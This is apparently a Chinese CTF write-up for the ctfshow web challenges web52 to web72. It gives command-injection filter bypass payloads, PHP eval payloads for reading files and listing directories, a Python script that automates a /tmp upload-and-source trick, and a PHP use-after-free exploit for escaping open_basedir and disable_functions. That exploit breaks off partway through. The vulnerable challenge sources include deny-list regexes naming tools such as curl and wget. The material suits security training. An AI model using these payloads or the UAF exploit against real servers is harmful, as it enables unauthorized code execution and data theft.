# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

**过滤了 `<>`**

```php
?c=nl${IFS}fla\g.php||
```

**查看源代码后，发现flag换位置了**

<img src="\images\article_images\image-20250503193322495.png" alt="image-20250503193322495" style="zoom: 33%;" />

&nbsp;

**查看根目录**

```php
?c=ls${IFS}/||
```

<img src="\images\article_images\image-20250503194743382.png" alt="image-20250503194743382" style="zoom: 33%;" />

&nbsp;

**查看根目录下的flag文件（根目录是 `/`）**

```php
?c=nl${IFS}/fla\g||
```

<img src="\images\article_images\image-20250503195142251.png" alt="image-20250503195142251" style="zoom:33%;" />

&nbsp;

---

# web53

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 18:21:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

**甚至不用命令分隔了**

```bash
?c=nl${IFS}fla\g.php
?c=ta''c${IFS}fla?.php
?c=ca''t${IFS}fla?.php  #之后查看源代码
```

<img src="\images\article_images\image-20250503195833343.png" alt="image-20250503195833343" style="zoom:33%;" />

&nbsp;

---

# web54

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 19:43:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

**==题解一==**

> **`grep test *file`   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行**
>
> **`grep '{' fla?.php`        在 fla?.php匹配到的文件中，查找含有 `{` 的文件，并打印出包含 `{` 的这一行**

```php
?c=grep${IFS}%27{%27${IFS}fla?.php

或者
    
?c=rev${IFS}fla?.php   #没有过滤rev，打印出来的是倒序
```

<img src="\images\article_images\image-20250503205018028.png" alt="image-20250503205018028" style="zoom:33%;" />

&nbsp;

**==题解二==**

**列出当前目录**

```bash
?c=ls
```

<img src="\images\article_images\image-20250503210636208.png" alt="image-20250503210636208" style="zoom: 25%;" />

&nbsp;

**将 `flag.php` 重命名为 `a.txt`**

> **`?c=mv flag.php a.txt`**

```bash
?c=mv${IFS}fla?.php${IFS}a.txt
```

<img src="\images\article_images\image-20250503214250838.png" alt="image-20250503214250838" style="zoom:33%;" />

&nbsp;

**再次查看当前目录，可见重命名成功**

```bash
?c=ls
```

<img src="\images\article_images\image-20250503214308471.png" alt="image-20250503214308471" style="zoom:33%;" />

&nbsp;

**访问 `/a.txt` 即可**

```bash
/a.txt
```

<img src="\images\article_images\image-20250503214330571.png" alt="image-20250503214330571" style="zoom: 33%;" />

&nbsp;



**==题解三==**

**将 `flag.php` 的内容复制到 `b.txt`**   

> **`?c=cp flag.php b.txt`**

```bash
?c=cp${IFS}fl??.php${IFS}b.txt
```

<img src="\images\article_images\image-20250503213904015.png" alt="image-20250503213904015" style="zoom:33%;" />

&nbsp;

**再次查看当前目录，可见复制成功**

```bash
?c=ls
```

<img src="\images\article_images\image-20250503213923696.png" alt="image-20250503213923696" style="zoom:33%;" />

&nbsp;

**访问 `/b.txt`**

```bash
/b.txt
```

<img src="\images\article_images\image-20250503213817077.png" alt="image-20250503213817077" style="zoom:25%;" />

&nbsp;



---

# web55

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 20:03:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

> **bin目录:**
>
> bin为binary的简写主要放置一些系统的必备执行档例如: cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等

&nbsp;

**==题解一==** 

**把文件 `flag.php` 的内容用 Base64 编码显示出来！**

```bash
/bin/base64 flag.php
```

**payload：**

```bash
?c=/???/????64 ????.???
```

<img src="\images\article_images\image-20250504102028319.png" alt="image-20250504102028319" style="zoom: 25%;" />

&nbsp;

<img src="\images\article_images\image-20250504102100579.png" alt="image-20250504102100579" style="zoom: 25%;" />

&nbsp;





**==题解二==**

**把 `flag.php` 文件压缩成：`flag.php.bz2`**

```bash
/usr/bin/bzip2 flag.php
```

**payload：**

```bash
?c=/???/???/????2 ????.???
```

<img src="\images\article_images\image-20250504000706256.png" alt="image-20250504000706256" style="zoom:80%;" />

&nbsp;

**访问 `/flag.php.bz2`** **，下载压缩包**

```bash
/flag.php.bz2
```

<img src="\images\article_images\image-20250504000808248.png" alt="image-20250504000808248" style="zoom:33%;" />

&nbsp;

**==题解三==**

> - Linux 系统下 php 接收上传文件的 post 包，默认会将文件保存在临时文件夹 `/tmp/`，文件名 `phpXXXXXX`。（最后一个字母一般/大概率为大写）
> - Linux 中 `.`（点）命令，或者叫 period，它的作用和 `source` 命令一样，就是用当前的 shell 执行一个文件中的命令。
> - ascii 码表中，大写字母位于 “ @ ” 与 “ [ ” 之间。(不包括 @ 和 [ )

**构造一个 post 请求并上传文件**

```html
<!--构造一个post上传文件的数据包，这是个上传页面，选择文件上传-->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://dc1bfe3e-910b-4ad5-9130-db7f0cd7cca4.challenge.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：==
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

**随便上传一个文件**

<img src="\images\article_images\image-20250504105948719.png" alt="image-20250504105948719" style="zoom: 25%;" />

&nbsp;

**抓包**

```bash
在 burp 拦截中，通过 GET 方式传递：
?c=.+/???/????????[@-[]

并在上传文件内容添加sh命令：
#!/bin/sh
ls
```

<img src="\images\article_images\image-20250504105905692.png" alt="image-20250504105905692" style="zoom: 25%;" />

&nbsp;

```bash
#!/bin/sh
cat flag.php
```

<img src="\images\article_images\image-20250504105824820.png" alt="image-20250504105824820" style="zoom:25%;" />

&nbsp;

---

# web56

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

**在上一题的基础上过滤了数字**

&nbsp;

**==题解一==**

**同web55**

&nbsp;

**==题解二==**

**python脚本**

```python
#ctfshow_web56.py

import requests
while True:
    url = 'http://6023df13-bdf0-46e7-aeef-aa61e3407731.challenge.ctf.show/?c=. /???/????????[@-[]'   #修改URL
    flag = requests.post(url=url,files={"file":("flag.txt","cat flag.php")}   #修改命令
    )
    
    if("ctf" in flag.text):
        print(flag.text)
        break
```

<img src="\images\article_images\image-20250504114615330.png" alt="image-20250504114615330" style="zoom:25%;" />

&nbsp;

---

# web57

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-08 01:02:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

**可知flag在 `36.php` 里面，所以要想办法构造 `36`**

```bash
echo $(()) = 0
对其按位取反
echo $((~$(()))) = -1
按位取反加起来
echo $(($((~$(())))$((~$(()))))) = -2
对上⾯的按位取反
echo $((~$(($((~$(())))$((~$(()))))))) = 1

$(())是⽤来作整数运算
如a=5 b=7 c=2
echo $((a+b*c)) = 19
$(())能进⾏的运算有
+ - * / 加、减、乘、除
% 余数运算
& | ^ ! AND、OR、XOR、NOT运算
```

**负数的 按位取反 是其 绝对值减1**

**所以我们只要构造出 `-37`，然后按位取反就能得到 `36`**

&nbsp;

**使用python生成**

```python
print("$((~$(("+"$((~$(())))"*37+"))))")
```

<img src="\images\article_images\image-20250504125334999.png" alt="image-20250504125334999" style="zoom:80%;" />

&nbsp;

**payload**

```php
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

&nbsp;

**查看源代码**

<img src="\images\article_images\image-20250504125302971.png" alt="image-20250504125302971" style="zoom: 50%;" />



&nbsp;

---

# web58

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

> ```bash
> c=print_r(scandir(dirname('__FILE__')));
> ```
>
> <img src="\images\article_images\image-20250504131645420.png" alt="image-20250504131645420" style="zoom:33%;" />
>
> 可以查看到当前目录，可以使用 复制、重命名等

**（system被禁用了）**

**payload**

```bash
c=show_source("flag.php");
c=highlight_file("flag.php");
c=include "php://filter/read=convert.base64-encode/resource=flag.php";
c=copy("flag.php","a.txt");         #之后访问/a.txt
c=rename("flag.php","b.txt");       #之后访问/b.txt
```

<img src="\images\article_images\image-20250504131146433.png" alt="image-20250504131146433" style="zoom:33%;" />

&nbsp;

---

# web59

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

**payload**

```bash
c=highlight_file("flag.php");

c=include "php://filter/convert.base64-encode/resource=flag.php";

c=include($_GET[a]);    #post
?a=php://filter/convert.base64-encode/resource=flag.php

c=print_r(file("flag.php"));
```

&nbsp;

---

# web60

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

<img src="\images\article_images\image-20250730214931280.png" alt="image-20250730214931280" style="zoom: 33%;" />

**payload**

```bash
c=highlight_file("flag.php");

c=include($_GET[a]);    #post
?a=php://filter/convert.base64-encode/resource=flag.php

#参考web40无参rce
c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));

c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));

c=show_source(next(array_reverse(scandir(pos(localeconv())))));

c=highlight_file(next(array_reverse(scandir('.'))));

c=highlight_file(array_slice(scandir('.'), 2, 1)[0]);
#array_slice() 的作用是：从数组中截取一段子数组。
#array_slice($array, $offset, $length)
#$offset = 2：从第 3 个元素（索引 2）开始，即跳过 . 和 ..
#$length = 1：只取 1 个元素
#[0]：取数组索引为0的，即取出文件名字符串（截取后的数组[0 => 'flag.php']）
```

&nbsp;

---

# web61

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

**payload**

```bash
c=highlight_file("flag.php");

c=show_source("flag.php");

c=include($_GET[a]);    #post
?a=php://filter/convert.base64-encode/resource=flag.php

c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

&nbsp;

---

# web62

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

**payload**

```bash
c=include("flag.php");var_dump(get_defined_vars()); #查看 变量名 => 值
#include("flag.php"):包含（即执行）当前目录下的 flag.php 文件。
#通常这个文件里会有：
#<?php
#   $flag = 'ctfshow{example_flag}';
#?>
#所以执行完这句后，变量 $flag 会被定义并存在于当前作用域中。

c=include("flag.php");echo $flag;  #变量名是$flag

c=highlight_file("flag.php");

c=show_source("flag.php");

c=include($_GET[a]);    #post
?a=php://filter/convert.base64-encode/resource=flag.php

c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

&nbsp;

---

# web63

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

**payload**

```bash
c=include("flag.php");var_dump(get_defined_vars()); #查看 变量名 => 值
c=include("flag.php");echo $flag;  #变量名是$flag

c=highlight_file("flag.php");

c=show_source("flag.php");

c=include($_GET[a]);    #post
?a=php://filter/convert.base64-encode/resource=flag.php

c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

&nbsp;

---

# web64

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

**payload**

```bash
c=include("flag.php");var_dump(get_defined_vars()); #查看 变量名 => 值
c=include("flag.php");echo $flag;  #变量名是$flag

c=highlight_file("flag.php");

c=show_source("flag.php");

c=include($_GET[a]);    #post
?a=php://filter/convert.base64-encode/resource=flag.php

c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

&nbsp;

---

# web65

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

> **file_get_contents() has been disabled**

**payload**

```bash
c=include("flag.php");var_dump(get_defined_vars()); #查看 变量名 => 值
c=include("flag.php");echo $flag;  #变量名是$flag

c=highlight_file("flag.php");

c=show_source("flag.php");

c=include($_GET[a]);    #post
?a=php://filter/convert.base64-encode/resource=flag.php

c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

&nbsp;

---

# web66

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

**`show_source()` 被禁用了**

**payload**

```bash
c=include("flag.php");var_dump(get_defined_vars()); #查看 变量名 => 值
c=include("flag.php");echo $flag;  #变量名是$flag

c=highlight_file("flag.php");

c=include($_GET[a]);    #post
?a=php://filter/convert.base64-encode/resource=flag.php

c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

<img src="\images\article_images\image-20250504144046452.png" alt="image-20250504144046452" style="zoom: 33%;" />

**发现flag换位置了**

**查看当前目录下文件**

```bash
c=var_dump(scandir('.'));
c=print_r(scandir("."));
```

**没有其他发现**

&nbsp;

**查看根目录下的文件**

```bash
c=var_dump(scandir('/'));
c=print_r(scandir("/"));
```

<img src="\images\article_images\image-20250504144454967.png" alt="image-20250504144454967" style="zoom:80%;" />

**在根目录下找到 `flag.txt`**

&nbsp;

**于是payload**

```bash
c=highlight_file('/flag.txt');
c=require("/flag.txt");
```

<img src="\images\article_images\image-20250504144649877.png" alt="image-20250504144649877" style="zoom: 33%;" />

&nbsp;

---

# web67

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

**`print_r` 被禁用**

**同web66**

```bash
c=highlight_file('/flag.txt');
c=require("/flag.txt");
```

&nbsp;

---

# web68

```html
Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19
```

&nbsp;

**有几个函数被禁用了**

**payload**

```bash
c=include("flag.php");echo $flag;
```

<img src="\images\article_images\image-20250504145958455.png" alt="image-20250504145958455" style="zoom:25%;" />

**`print_r` 也被禁用了**

**查看根目录下文件**

```bash
c=var_dump(scandir("/"));
```

**flag 在 `flag.txt` 里**

```bash
c=include("/flag.txt");    #此时flag.txt里面没有变量flag
c=require("/flag.txt");
```

<img src="\images\article_images\image-20250504152254384.png" alt="image-20250504152254384" style="zoom:50%;" />

&nbsp;

---

# web69

```php
Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19
```

&nbsp;

**这一题的 `print_r` `var_dump`  `highlight_file` 都被禁用了**

**==题解一==**

**查看根目录 payload**

```bash
c=var_export(scandir("/"));
```

**输出flag内容**

```bash
c=include("/flag.txt");
c=require("/flag.txt");
```

&nbsp;

**==题解二==**

```bash
c=$a=opendir("/");while(($b = readdir($a))!==false){echo $b." ";}
c=$a=opendir("/");while(($b = readdir())!==false){echo $b." ";}
#opendir("/") 打开根目录，readdir($a) 循环读取该目录下的文件，echo $b 输出每个文件名，帮助查找目标文件。

c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString()." ");}
#用DirectoryIterator类创建一个对象，命名为a，让该对象读取“glob:///*”这个目录里的内容
#"glob:///*" 是一种特殊的路径写法，表示“根目录下的所有文件和文件夹”。
#foreach ($a as $f)：遍历 $a 里包含的每一个文件或文件夹。每次循环，$f 就代表一个文件或者文件夹。
#$f->__toString()：获取文件或文件夹的完整名字（包括路径）的写法。即把文件夹或者文件“转成字符串”来显示。
```

<img src="\images\article_images\image-20250504162303870.png" alt="image-20250504162303870" style="zoom:80%;" />

&nbsp;

**输出flag内容**

```bash
c=include("/flag.txt");
c=require("/flag.txt");
#直接输出 flag.txt 的内容
```

&nbsp;

---

# web70

```php
Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14

Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15

Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 21
你要上天吗？
```

&nbsp;



**==题解一==**

**查看根目录 payload**

```bash
c=var_export(scandir("/"));
```

**输出flag内容**

```bash
c=include("/flag.txt");
c=require("/flag.txt");
```

&nbsp;

**==题解二==**

```bash
c=$a=opendir("/");while(($b = readdir())!==false){echo $b." ";}
c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString()." ");}

c=$a=new DirectoryIterator("glob:///*.txt");foreach($a as $f){echo($f->__toString()." ");}exit();  #这个直接会回显出flag的文件名
```

**输出flag内容**

```bash
c=include("/flag.txt");
c=require("/flag.txt");
```

&nbsp;

---

# web71

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？ 
```

**代码的意思是**

**`eval($c)` 执行用户提交的代码 `$_POST['c']`。**

**`ob_get_contents();` 获取输出缓冲区的内容 / `ob_get_contents()` 用来获取之前通过 `echo` 或 `print` 输出的内容。**

**在 `eval()` 执行后，如果有输出，它会被存储在 `$s` 变量中。**

**`ob_end_clean();` 关闭并清理输出缓冲区。它将会清除所有缓冲的内容（即清除 $s 中的内容），不再输出。**

**使用 `preg_replace()`对 `$s` 中的内容进行正则替换：**

**最终输出经过替换的结果，所有字母和数字都被替换成了 `?`。**

&nbsp;

**利用 `exit()` 可以让前面的语句执行完就退出，而不需要执行后面的语句。**

```php
c=var_export(scandir("/"));exit();
c=$a=opendir("/");while(($b = readdir())!==false){echo $b." ";}exit();
c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString()." ");}exit();

c=$a=new DirectoryIterator("glob:///*.txt");foreach($a as $f){echo($f->__toString()." ");}exit();  #这个直接会回显出flag的文件名
```

```bash
c=include("/flag.txt");exit();
c=require("/flag.txt");exit();
```

&nbsp;

---

# web72

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```

**和上一题是有区别的**

&nbsp;

**这道题只有这个命令可以查询根目录文件**

```bash
c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString()." ");}exit();

c=$a=new DirectoryIterator("glob:///*.txt");foreach($a as $f){echo($f->__toString()." ");}exit();  #这个直接会回显出flag的文件名
```

<img src="\images\article_images\image-20250504170507403.png" alt="image-20250504170507403" style="zoom:33%;" />

&nbsp;

**flag文件名改变了，`flag0.txt`**

&nbsp;

**当想用 `c=include(“/flag0.txt);exit();”` 时，发现有 `open_basedir` 限制**

```html
Warning: include(): open_basedir restriction in effect. File(/flag0.txt) is not within the allowed path(s): (/var/www/html/) in /var/www/html/index.php(19) : eval()'d code on line 1
```

<img src="\images\article_images\image-20250504170917523.png" alt="image-20250504170917523" style="zoom:80%;" />

&nbsp;

>  **`open_basedir` ：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如 `fopen()` 或 `file_get_contents()` 打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开**

&nbsp;

**用uaf脚本来命令执行，脚本( `c=` 之后)要进行URL编码**

<img src="\images\article_images\image-20250504173623856.png" alt="image-20250504173623856" style="zoom:33%;" />

&nbsp;

<img src="\images\article_images\image-20250504172814598.png" alt="image-20250504172814598" style="zoom: 33%;" />

&nbsp;

**POC脚本**

```php
c=function ctfshow($cmd) {     #在这里修改传入的参数
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() {
            global $backtrace;
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if (!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for ($j = $s - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i = 0; $i < $m; $i++) {
            $out .= sprintf("%c", ($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for ($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c", ($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if ($s != 8) {
            $leak %= 2 << ($s * 8) - 1;
        }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
        for ($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
            if ($p_type == 1 && $p_flags == 6) {
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if ($p_type == 1 && $p_flags == 5) {
                $text_size = $p_memsz;
            }
        }
        if (!$data_addr || !$text_size || !$data_size) return false;
        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for ($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if ($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                if ($deref != 0x746e6174736e6f63) continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if ($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                if ($deref != 0x786568326e6962) continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for ($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if ($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
            if ($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while ($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' .
                           'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if (stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10;
    $contiguous = [];
    for ($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' .
                                    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');

    $abc = $backtrace[1]['args'][0];
    $helper = new Helper;
    $helper->b = function ($x) { };

